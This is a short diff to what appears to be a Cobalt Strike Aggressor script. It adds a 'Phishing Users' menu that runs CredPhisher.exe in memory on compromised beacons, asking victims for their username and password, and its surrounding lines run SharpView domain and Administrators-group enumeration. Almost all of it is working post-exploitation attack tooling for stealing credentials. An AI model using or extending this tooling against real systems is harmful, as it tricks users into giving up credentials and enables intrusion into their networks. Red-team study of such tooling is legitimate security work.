@@ -66,6 +66,18 @@ menu "Domain User Enumeration"
 			}
 }
 
+menu "Phishing Users"
+{
+########Run CredPhisher##################
+					
+		item "Prompt for Username and Password"{
+			local('$bid');
+				foreach $bid ($1){
+					credphisher($bid);
+				}
+			}
+}
+
 menu "Domain Computer Object Enumeration"
 {
 	
@@ -170,5 +182,11 @@ bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Iden
 sub getnetgroupadministrator{
 
 bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Administrators" -Recursive');
+
+}
+
+sub credphisher{
+
+bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), 'Please_Enter_Your_Password');
 
 }
